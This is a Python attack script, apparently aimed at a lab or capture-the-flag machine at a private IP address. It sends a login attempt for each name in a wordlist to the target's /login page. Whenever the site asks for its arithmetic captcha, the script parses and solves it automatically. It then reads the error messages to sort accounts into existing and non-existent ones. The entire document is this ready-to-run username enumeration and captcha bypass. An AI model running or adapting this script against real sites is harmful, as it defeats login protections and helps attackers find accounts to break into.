import re
import requests

BASE_URL = "http://10.48.154.211"
LOGIN_URL = f"{BASE_URL}/login"

session = requests.Session()

CAPTCHA_RE = re.compile(r'(\d+)\s*([+\-*])\s*(\d+)\s*=\s*\?')

def find_captcha(html):
    """
    Returns (a, op, b) if a captcha question is present in the page,
    or None if the page doesn't currently require one.
    """
    match = CAPTCHA_RE.search(html)
    if not match:
        return None
    return match.groups()

def solve_captcha(a, op, b):
    a, b = int(a), int(b)
    if op == '+':
        return a + b
    elif op == '-':
        return a - b
    elif op == '*':
        return a * b
    raise ValueError(f"Unknown operator: {op}")

def attempt_login(username, password):
    """
    Sends the login POST directly. If the response indicates a captcha
    is required, parses the arithmetic question from that response,
    solves it, and resubmits with the answer included.
    """
    data = {"username": username, "password": password}

    resp = session.post(LOGIN_URL, data=data, allow_redirects=False)

    captcha = find_captcha(resp.text)
    if captcha:
        a, op, b = captcha
        answer = solve_captcha(a, op, b)
        print(f"[+] Captcha required: {a} {op} {b} = {answer}")
        data["captcha"] = answer
        resp = session.post(LOGIN_URL, data=data, allow_redirects=False)

    return resp

def check_username(username, password="test123"):
    """
    Sends one login attempt for `username` and classifies the result
    based on the error message returned.
    """
    resp = attempt_login(username, password)
    text = resp.text

    if "does not exist" in text:
        return "invalid_user"
    elif "Invalid captcha" in text:
        return "captcha_failed"
    elif "incorrect password" in text.lower() or "wrong password" in text.lower():
        return "valid_user_wrong_pw"
    elif "Log in" not in text or resp.status_code in (301, 302, 303, 307, 308):
        return "possible_success"
    else:
        return "unknown"

def load_usernames(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

def find_valid_usernames(usernames, password="test123"):
    results = {}
    for username in usernames:
        verdict = check_username(username, password)
        results[username] = verdict
        print(f"[{verdict:>20}] {username}")
    return results

if __name__ == "__main__":
    USERNAMES = load_usernames("usernames.txt")
    print(f"[+] Loaded {len(USERNAMES)} usernames from usernames.txt")

    results = find_valid_usernames(USERNAMES)

    print("\n---- summary ----")
    interesting = {u: v for u, v in results.items() if v != "invalid_user"}
    for u, v in interesting.items():
        print(f"{u}: {v}")
